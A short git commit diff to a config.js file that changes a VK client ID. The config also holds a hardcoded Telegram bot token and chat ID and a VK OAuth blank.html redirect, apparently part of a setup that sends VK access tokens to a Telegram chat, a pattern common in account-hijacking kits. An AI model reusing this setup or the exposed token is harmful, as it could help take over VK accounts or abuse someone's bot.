e8660b956ee5fded181d92f750fee9a52231bbc3
ya3ya3mack3-wq <ya3ya3mack3@gmail.com>
2026-01-20 17:29:56 +0300

    config.js

--- config.js
+++ config.js
@@ -3,7 +3,8 @@ const CONFIG = {
     TELEGRAM_BOT_TOKEN: '8332901581:AAFTLzw8aOJQLtAz_l2L_iXKUyyB_wDNC_U', // ТВОЙ ТОКЕН
     TELEGRAM_CHAT_ID: '-1003655249990', // ТВОЙ CHAT ID
     REDIRECT_URI: 'https://oauth.vk.com/blank.html', // Рабочий redirect
-    VK_CLIENT_ID: '2685278' // Публичное приложение VK
+    VK_CLIENT_ID: '6121396' // Публичное приложение VK
 };
+
 
 window.CONFIG = CONFIG;
